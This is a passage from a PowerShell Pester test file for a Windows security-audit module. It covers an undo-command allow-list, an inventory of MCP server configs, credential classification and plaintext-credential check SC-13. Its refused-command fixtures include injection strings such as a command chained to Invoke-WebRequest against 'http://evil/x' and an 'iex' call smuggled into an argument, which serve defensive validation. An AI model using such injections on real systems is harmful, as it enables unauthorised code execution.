                "Enable-NetFirewallRule -Name 'RuleX'",
                "Enable-LocalUser -SID 'S-1-5-21-1-2-3-1001'",
                "net.exe user 'bob' /passwordreq:no",
                "Add-MpPreference -AttackSurfaceReductionRules_Ids 'abc' -AttackSurfaceReductionRules_Actions 'Enabled'",
                "Set-Service -Name 'W32Time' -StartupType 'Manual'",
                "wevtutil.exe sl Application /ms:20971520",
                "net.exe accounts /lockoutthreshold:10; net.exe accounts /lockoutduration:15 /lockoutwindow:15",
                "Set-ItemProperty -LiteralPath 'HKLM:\SYSTEM\CurrentControlSet\Control\SecureBoot' -Name 'AvailableUpdates' -Value 0",
                "Suspend-BitLocker -MountPoint `$env:SystemDrive -RebootCount 1 | Out-Null",
                "Enable-WindowsOptionalFeature -Online -FeatureName 'SMB1Protocol' -NoRestart -All | Out-Null"
            )
            foreach ($c in $ok) { Test-CEUndoCommandAllowed $c | Should -BeNullOrEmpty -Because $c }
        }
    }

    It 'refuses anything outside the allow-list or with code-execution constructs' {
        InModuleScope CEAudit {
            $bad = @(
                "Invoke-Expression 'calc'",
                "Start-Process calc.exe",
                "Set-Service -Name 'x' -StartupType 'Manual'; Invoke-WebRequest 'http://evil/x'",
                "[System.IO.File]::WriteAllText('a.txt','pwned')",
                "& { whoami }",
                "Set-NetFirewallProfile -Name (iex 'evil')"
            )
            foreach ($c in $bad) { Test-CEUndoCommandAllowed $c | Should -Not -BeNullOrEmpty -Because $c }
        }
    }
}

Describe 'MCP inventory (11-McpInventory)' {
    Context 'JSONC parsing' {
        It 'parses strict JSON' {
            InModuleScope CEAudit { (ConvertFrom-CEJsonc -Text '{"a":1}').a | Should -Be 1 }
        }
        It 'tolerates line and block comments and trailing commas' {
            InModuleScope CEAudit {
                $t = "{`n // c`n `"servers`": { `"x`": { `"command`": `"npx`", }, /* b */ },`n}"
                (ConvertFrom-CEJsonc -Text $t).servers.x.command | Should -Be 'npx'
            }
        }
        It 'does not strip // or commas inside strings' {
            InModuleScope CEAudit {
                $r = ConvertFrom-CEJsonc -Text '{"url":"https://x/y","note":"a, b"}'
                $r.url | Should -Be 'https://x/y'
                $r.note | Should -Be 'a, b'
            }
        }
        It 'throws on genuinely malformed input' {
            InModuleScope CEAudit { { ConvertFrom-CEJsonc -Text '{ not json' } | Should -Throw }
        }
    }
    Context 'credential classification' {
        It 'classifies by prefix and marks plaintext' {
            InModuleScope CEAudit {
                $p = Get-CECredentialPatterns
                $c = Get-CECredentialClass -Key 'GITHUB_PERSONAL_ACCESS_TOKEN' -Value 'ghp_abcdEFGH1234567890' -Patterns $p
                $c.provider | Should -Be 'github'; $c.type | Should -Be 'pat-classic'; $c.storage | Should -Be 'plaintext-config'
            }
        }
        It 'treats a reference as env-var-reference, not plaintext' {
            InModuleScope CEAudit {
                $p = Get-CECredentialPatterns
                (Get-CECredentialClass -Key 'API_KEY' -Value '${env:MY_KEY}' -Patterns $p).storage | Should -Be 'env-var-reference'
            }
        }
        It 'returns null for a non-credential key/value' {
            InModuleScope CEAudit {
                $p = Get-CECredentialPatterns
                Get-CECredentialClass -Key 'command' -Value 'npx' -Patterns $p | Should -BeNullOrEmpty
            }
        }
        It 'returns unknown provider rather than guessing' {
            InModuleScope CEAudit {
                $p = Get-CECredentialPatterns
                (Get-CECredentialClass -Key 'SOME_TOKEN' -Value 'literalsecretvalue' -Patterns $p).provider | Should -Be 'unknown'
            }
        }
    }
    Context 'inventory end to end' {
        BeforeAll {
            $script:mcpTmp = Join-Path ([IO.Path]::GetTempPath()) ('eb-mcp-' + [guid]::NewGuid().ToString('N'))
            New-Item -ItemType Directory -Path $script:mcpTmp -Force | Out-Null
            $script:secret = 'ghp_SUPERsecretVALUE0123456789abcd'
            $fixture = '{ "mcpServers": { "github": { "command": "npx", "args": ["-y","@modelcontextprotocol/server-github"], "env": { "GITHUB_PERSONAL_ACCESS_TOKEN": "' + $script:secret + '" } }, "safe": { "command": "npx", "args": ["-y","@x/server"], "env": { "OPENAI_API_KEY": "${env:MY_KEY}" } } } }'
            $fixture | Set-Content -LiteralPath (Join-Path $script:mcpTmp '.claude.json') -Encoding ascii
        }
        AfterAll { Remove-Item -LiteralPath $script:mcpTmp -Recurse -Force -ErrorAction SilentlyContinue }
        It 'inventories servers and classifies credentials in the user session' {
            $inv = InModuleScope CEAudit -Parameters @{ Tmp = $script:mcpTmp } {
                param($Tmp)
                Mock Get-CEUserProfilePath { $Tmp }
                Get-CEMcpInventory -Context ([pscustomobject]@{ ComputerName = 'T'; AuditTime = (Get-Date); IsElevated = $false; IsSystem = $false; ConsoleUserSid = $null })
            }
            $inv.mcpConfigsFound | Should -Be 1
            $inv.mcpConfigsParsed | Should -Be 1
            @($inv.mcpServers).Count | Should -Be 2
            $inv.credentialsFound | Should -Be 2
            $inv.credentialsPlaintext | Should -Be 1
        }
        It 'never lets a credential value reach the output' {
            $json = InModuleScope CEAudit -Parameters @{ Tmp = $script:mcpTmp } {
                param($Tmp)
                Mock Get-CEUserProfilePath { $Tmp }
                (Get-CEMcpInventory -Context ([pscustomobject]@{ ComputerName = 'T2'; AuditTime = (Get-Date); IsElevated = $false; IsSystem = $false; ConsoleUserSid = $null })) | ConvertTo-Json -Depth 12
            }
            $json | Should -Not -Match ([regex]::Escape($script:secret))
        }
        It 'machine (SYSTEM) context records presence only, never reads contents' {
            $res = InModuleScope CEAudit -Parameters @{ Tmp = $script:mcpTmp } {
                param($Tmp)
                Mock Get-CEUserProfilePath { $Tmp }
                $i = Get-CEMcpInventory -Context ([pscustomobject]@{ ComputerName = 'T3'; AuditTime = (Get-Date); IsElevated = $true; IsSystem = $true; ConsoleUserSid = 'S-1-5-21-1-1-1-1001' })
                [pscustomobject]@{ Found = $i.mcpConfigsFound; Parsed = $i.mcpConfigsParsed; Creds = $i.credentialsFound; Json = ($i | ConvertTo-Json -Depth 12) }
            }
            $res.Found | Should -Be 1
            $res.Parsed | Should -Be 0
            $res.Creds | Should -Be 0
            $res.Json | Should -Not -Match ([regex]::Escape($script:secret))
        }
        It 'machine (SYSTEM) context does not look up config files through a link in the profile, and says it found the link' {
            # alice's .cursor is a junction to bob's: as SYSTEM, bob's file must not be looked up under alice.
            # The link is reported as found, not read, rather than dropped.
            $alice = Join-Path $TestDrive 'mcp-alice'
            $bob = Join-Path $TestDrive 'mcp-bob\.cursor'
            New-Item -ItemType Directory -Force -Path $alice, $bob, (Join-Path $alice 'AppData\Roaming\Claude') | Out-Null
            Set-Content -LiteralPath (Join-Path $bob 'mcp.json') -Value '{ "mcpServers": {} }' -Encoding ASCII
            Set-Content -LiteralPath (Join-Path $alice 'AppData\Roaming\Claude\claude_desktop_config.json') -Value '{ "mcpServers": {} }' -Encoding ASCII
            $link = Join-Path $alice '.cursor'
            New-Item -ItemType Junction -Path $link -Target $bob | Out-Null
            try {
                $inv = InModuleScope CEAudit -Parameters @{ P = $alice } {
                    param($P)
                    Mock Get-CEUserProfilePath { $P }
                    Get-CEMcpInventory -Context ([pscustomobject]@{ ComputerName = 'T4'; AuditTime = (Get-Date); IsElevated = $true; IsSystem = $true; ConsoleUserSid = 'S-1-5-21-1-1-1-1001' })
                }
                $inv.mcpConfigsFound | Should -Be 2 -Because 'the file reached through plain folders, and the link on the way to the other'
                @($inv.mcpServers | ForEach-Object { $_.configPath }) | Should -Be @('AppData\Roaming\Claude\claude_desktop_config.json') -Because 'only the file reached through plain folders is recorded as present'
                @($inv.mcpConfigsUnreadable | ForEach-Object { "$($_.path)|$($_.reason)|$($_.needsUserSession)" }) |
                    Should -Be @('.cursor\mcp.json|not read: the folder .cursor on the way to it is a junction or symbolic link, which an elevated or SYSTEM audit does not follow|True')
            }
            finally { if ([IO.Directory]::Exists($link)) { [IO.Directory]::Delete($link) } }
        }
        It 'machine (SYSTEM) context does not look up a config file that is itself a link, and says it found it' {
            # The -NoLink part: every folder on the way is plain, but the file is a link. A test account
            # can't create a file symbolic link, so the link check says so for .claude.json.
            $inv = InModuleScope CEAudit -Parameters @{ Tmp = $script:mcpTmp } {
                param($Tmp)
                Mock Get-CEUserProfilePath { $Tmp }
                Mock Test-CELinkItem { $Item.Name -eq '.claude.json' }
                [pscustomobject]@{
                    System   = Get-CEMcpInventory -Context ([pscustomobject]@{ ComputerName = 'T5'; AuditTime = (Get-Date); IsElevated = $true; IsSystem = $true; ConsoleUserSid = 'S-1-5-21-1-1-1-1001' })
                    Elevated = Get-CEMcpInventory -Context ([pscustomobject]@{ ComputerName = 'T6'; AuditTime = (Get-Date); IsElevated = $true; IsSystem = $false; ConsoleUserSid = $null })
                    User     = Get-CEMcpInventory -Context ([pscustomobject]@{ ComputerName = 'T7'; AuditTime = (Get-Date); IsElevated = $false; IsSystem = $false; ConsoleUserSid = $null })
                }
            }
            foreach ($k in 'System', 'Elevated') {
                # An elevated audit has more rights than the user too.
                $inv.$k.mcpConfigsFound | Should -Be 1 -Because "$k reports the link as found"
                $inv.$k.mcpConfigsParsed | Should -Be 0
                @($inv.$k.mcpServers).Count | Should -Be 0 -Because "$k does not record a link's permissions or contents"
                @($inv.$k.mcpConfigsUnreadable | ForEach-Object { "$($_.path)|$($_.reason)" }) |
                    Should -Be @('.claude.json|not read: it is a junction or symbolic link, which an elevated or SYSTEM audit does not follow')
            }
            $inv.User.mcpConfigsFound | Should -Be 1 -Because "the user's own session follows their links"
            $inv.User.mcpConfigsParsed | Should -Be 1
            @($inv.User.mcpConfigsUnreadable).Count | Should -Be 0
        }
        It 'machine (SYSTEM) context does not record a config file that is a real symbolic link' {
            $dir = Join-Path $TestDrive 'mcp-filelink'
            New-Item -ItemType Directory -Force -Path $dir | Out-Null
            $link = Join-Path $dir '.claude.json'
            try { New-Item -ItemType SymbolicLink -Path $link -Target (Join-Path $script:mcpTmp '.claude.json') -ErrorAction Stop | Out-Null }
            catch { Set-ItResult -Skipped -Because "this account can't create symbolic links: $($_.Exception.Message)"; return }
            try {
                $inv = InModuleScope CEAudit -Parameters @{ P = $dir } {
                    param($P)
                    Mock Get-CEUserProfilePath { $P }
                    Get-CEMcpInventory -Context ([pscustomobject]@{ ComputerName = 'T8'; AuditTime = (Get-Date); IsElevated = $true; IsSystem = $true; ConsoleUserSid = 'S-1-5-21-1-1-1-1001' })
                }
                @($inv.mcpServers).Count | Should -Be 0
                @($inv.mcpConfigsUnreadable | ForEach-Object { $_.reason }) | Should -Be @('not read: it is a junction or symbolic link, which an elevated or SYSTEM audit does not follow')
            }
            finally { Remove-Item -LiteralPath $link -Force }
        }
        It 'an elevated audit reports a config behind a link as found, not read, and SC-13 says so; the user session reads it' {
            # alice keeps .cursor in a dotfiles folder through a junction, and its mcp.json holds a plaintext PAT.
            $alice = Join-Path $TestDrive 'mcp-elev-alice'
            $dots = Join-Path $TestDrive 'mcp-elev-dotfiles\.cursor'
            New-Item -ItemType Directory -Force -Path $alice, $dots | Out-Null
            $cfg = '{ "mcpServers": { "github": { "command": "npx", "args": ["-y","@modelcontextprotocol/server-github"], "env": { "GITHUB_PERSONAL_ACCESS_TOKEN": "' + $script:secret + '" } } } }'
            Set-Content -LiteralPath (Join-Path $dots 'mcp.json') -Value $cfg -Encoding ASCII
            $link = Join-Path $alice '.cursor'
            New-Item -ItemType Junction -Path $link -Target $dots | Out-Null
            try {
                $inv = InModuleScope CEAudit -Parameters @{ P = $alice } {
                    param($P)
                    Mock Get-CEUserProfilePath { $P }
                    [pscustomobject]@{
                        Elevated = Get-CEMcpInventory -Context ([pscustomobject]@{ ComputerName = 'T9'; AuditTime = (Get-Date); IsElevated = $true; IsSystem = $false; ConsoleUserSid = $null })
                        User     = Get-CEMcpInventory -Context ([pscustomobject]@{ ComputerName = 'T10'; AuditTime = (Get-Date); IsElevated = $false; IsSystem = $false; ConsoleUserSid = $null })
                    }
                }
                $why = 'not read: the folder .cursor on the way to it is a junction or symbolic link, which an elevated or SYSTEM audit does not follow'
                $inv.Elevated.mcpConfigsFound | Should -Be 1 -Because 'a config behind a link is found, not read, never dropped'
                $inv.Elevated.mcpConfigsParsed | Should -Be 0
                @($inv.Elevated.mcpServers).Count | Should -Be 0
                @($inv.Elevated.mcpConfigsUnreadable | ForEach-Object { "$($_.path)|$($_.toolId)|$($_.reason)|$($_.needsUserSession)" }) | Should -Be @(".cursor\mcp.json|cursor|$why|True")
                ($inv.Elevated | ConvertTo-Json -Depth 12) | Should -Not -Match ([regex]::Escape($script:secret))
                $inv.User.mcpConfigsFound | Should -Be 1
                $inv.User.mcpConfigsParsed | Should -Be 1
                $inv.User.credentialsPlaintext | Should -Be 1

                # SC-13 on the elevated audit: Manual with the config as evidence, not NotApplicable.
                Set-TestDevice -Kind Insecure -ContextOverride @{ IsElevated = $true; IsSystem = $false }
                $global:CETestMcp = $inv.Elevated
                Mock -ModuleName CEAudit Get-CEMcpInventory { $global:CETestMcp }
                $f = @(Invoke-CEAuditCore -Id 'SC-13')
                $f.Count | Should -Be 1
                $f[0].Status | Should -Be 'Manual'
                $f[0].Actual | Should -Be "No MCP servers were read, but 1 MCP config file(s) were found and not read: .cursor\mcp.json (cursor): $why"
                @($f[0].Evidence) | Should -Be @(".cursor\mcp.json (cursor): $why")
                $f[0].Recommendation | Should -Match 'without elevation while signed in as that user'
                $f[0].Recommendation | Should -Match 'Invoke-CEUserProbe\.ps1, runs this check'
                # The user's own session reads it and finds the plaintext PAT.
                $global:CETestMcp = $inv.User
                $f = @(Invoke-CEAuditCore -Id 'SC-13')
                $f[0].Status | Should -BeIn @('Fail', 'Warn')
                $f[0].Actual | Should -Match 'github in \.cursor\\mcp\.json: github'
            }
            finally {
                if ([IO.Directory]::Exists($link)) { [IO.Directory]::Delete($link) }
                Remove-Variable -Name CETestMcp -Scope Global -ErrorAction SilentlyContinue
            }
        }
        It 'an elevated audit does not download a config file stored online only' {
            $inv = InModuleScope CEAudit -Parameters @{ Tmp = $script:mcpTmp } {
                param($Tmp)
                Mock Get-CEUserProfilePath { $Tmp }
                Mock Get-CEUserFileSkipReason { if ($Item.Name -eq '.claude.json') { 'it is stored online only, and an elevated or SYSTEM audit does not download it' } else { '' } }
                Get-CEMcpInventory -Context ([pscustomobject]@{ ComputerName = 'T11'; AuditTime = (Get-Date); IsElevated = $true; IsSystem = $false; ConsoleUserSid = $null })
            }
            $inv.mcpConfigsFound | Should -Be 1
            $inv.mcpConfigsParsed | Should -Be 0
            @($inv.mcpConfigsUnreadable | ForEach-Object { $_.reason }) | Should -Be @('not read: it is stored online only, and an elevated or SYSTEM audit does not download it')
        }
    }
}

Describe 'SC-13 AI agent plaintext credentials' {
    function global:New-TestMcp {
        param([object[]]$Servers = @(), [int]$Plaintext = 0, [object[]]$Unreadable = @())
        [ordered]@{
            mcpConfigsFound = @($Servers).Count + @($Unreadable).Count; mcpConfigsParsed = @($Servers).Count
            mcpConfigsUnreadable = @($Unreadable); mcpServers = @($Servers)
            credentialsFound = @(@($Servers) | ForEach-Object { @($_.credentials) }).Count
            credentialsPlaintext = $Plaintext; scanBounds = 'test'
        }
    }
    function global:New-TestMcpServer {
        param([string]$Acl = '', [object[]]$Entries = @(), [string]$Transport = 'stdio')
        [ordered]@{ toolId = 'claude-code'; configPath = '.claude.json'; serverName = 'github'; transport = $Transport
            command = 'npx'; argsSummary = '@x'; endpoint = ''; credentialCount = @($Entries).Count
            credentials = @($Entries); configAclIssue = $Acl }
    }
    BeforeEach { Set-TestDevice 'Insecure' }

    It 'is NotApplicable when no MCP servers are configured' {
        Mock -ModuleName CEAudit Get-CEMcpInventory { New-TestMcp }
        (@(Invoke-CEAuditCore -Id 'SC-13')[0]).Status | Should -Be 'NotApplicable'
    }
    It 'Fails when a plaintext credential sits in a config others can modify' {
        $cred = [ordered]@{ key = 'GITHUB_TOKEN'; provider = 'github'; type = 'pat-classic'; storage = 'plaintext-config' }
        Mock -ModuleName CEAudit Get-CEMcpInventory { New-TestMcp -Plaintext 1 -Servers @(New-TestMcpServer -Acl '.claude.json is writable by S-1-5-32-545' -Entries @($cred)) }
        (@(Invoke-CEAuditCore -Id 'SC-13')[0]).Status | Should -Be 'Fail'
    }
    It 'Warns when a plaintext credential is in a locked-down config' {
        $cred = [ordered]@{ key = 'GITHUB_TOKEN'; provider = 'github'; type = 'pat-classic'; storage = 'plaintext-config' }
        Mock -ModuleName CEAudit Get-CEMcpInventory { New-TestMcp -Plaintext 1 -Servers @(New-TestMcpServer -Acl '' -Entries @($cred)) }
        (@(Invoke-CEAuditCore -Id 'SC-13')[0]).Status | Should -Be 'Warn'
    }
    It 'Passes when every credential is a reference' {
        $cred = [ordered]@{ key = 'GITHUB_TOKEN'; provider = 'github'; type = 'unknown'; storage = 'env-var-reference' }
        Mock -ModuleName CEAudit Get-CEMcpInventory { New-TestMcp -Plaintext 0 -Servers @(New-TestMcpServer -Entries @($cred)) }
        (@(Invoke-CEAuditCore -Id 'SC-13')[0]).Status | Should -Be 'Pass'
    }
    It 'is Manual in a machine context where contents were not read' {
        Mock -ModuleName CEAudit Get-CEMcpInventory { New-TestMcp -Servers @(New-TestMcpServer -Transport 'not-read') }
        (@(Invoke-CEAuditCore -Id 'SC-13')[0]).Status | Should -Be 'Manual'
    }
    It 'is Manual, not NotApplicable, when configs were found but not read, and names them' {
        Mock -ModuleName CEAudit Get-CEMcpInventory {
            New-TestMcp -Unreadable @([ordered]@{ path = '.claude.json'; toolId = 'claude-code'; reason = 'not read: it is stored online only, and an elevated or SYSTEM audit does not download it'; needsUserSession = $true })
        }
        $f = @(Invoke-CEAuditCore -Id 'SC-13')
        $f[0].Status | Should -Be 'Manual'
        @($f[0].Evidence) | Should -Be @('.claude.json (claude-code): not read: it is stored online only, and an elevated or SYSTEM audit does not download it')
        $f[0].Recommendation | Should -Match 'Invoke-CEUserProbe'
        # A config that could not be parsed is advised on differently.
        Mock -ModuleName CEAudit Get-CEMcpInventory {
            New-TestMcp -Unreadable @([ordered]@{ path = '.claude.json'; toolId = 'claude-code'; reason = 'Invalid JSON'; needsUserSession = $false })
        }
        $f = @(Invoke-CEAuditCore -Id 'SC-13')
        $f[0].Status | Should -Be 'Manual'
        $f[0].Recommendation | Should -Not -Match 'elevat'
        $f[0].Recommendation | Should -Match 'valid JSON'
    }
    It 'does not Pass while a config was found but not read' {
        $cred = [ordered]@{ key = 'GITHUB_TOKEN'; provider = 'github'; type = 'unknown'; storage = 'env-var-reference' }
        Mock -ModuleName CEAudit Get-CEMcpInventory {
            New-TestMcp -Servers @(New-TestMcpServer -Entries @($cred)) -Unreadable @([ordered]@{ path = '.cursor\mcp.json'; toolId = 'cursor'; reason = 'not read: it is a junction or symbolic link, which an elevated or SYSTEM audit does not follow'; needsUserSession = $true })
        }
        $f = @(Invoke-CEAuditCore -Id 'SC-13')
        $f[0].Status | Should -Be 'Manual'
        $f[0].Actual | Should -Match 'found but not read: \.cursor\\mcp\.json \(cursor\)'
    }
}

Describe 'Get-CEAiPosture MCP folding' {
    It 'folds plaintext credentials into deviations and exposes the count and servers' {
        Set-TestDevice 'Insecure'
        Mock -ModuleName CEAudit Get-CEMcpInventory {
            [ordered]@{ mcpConfigsFound = 1; mcpConfigsParsed = 1; mcpConfigsUnreadable = @()
                mcpServers = @([ordered]@{ toolId = 'claude-code'; configPath = '.claude.json'; serverName = 'github'; transport = 'stdio'; command = 'npx'; argsSummary = '@x'; endpoint = ''; credentialCount = 1; credentials = @([ordered]@{ key = 'GITHUB_TOKEN'; provider = 'github'; type = 'pat-classic'; storage = 'plaintext-config' }); configAclIssue = '' })
                credentialsFound = 1; credentialsPlaintext = 1; scanBounds = 'test' }
        }
        $ai = InModuleScope CEAudit { Get-CEAiPosture -Context (Get-CEDeviceContext) }
        $ai.credentialsPlaintext | Should -Be 1
        $ai.deviations | Should -BeGreaterOrEqual 1
        $ai.contained | Should -BeFalse
        @($ai.mcpServers).Count | Should -Be 1
    }
}
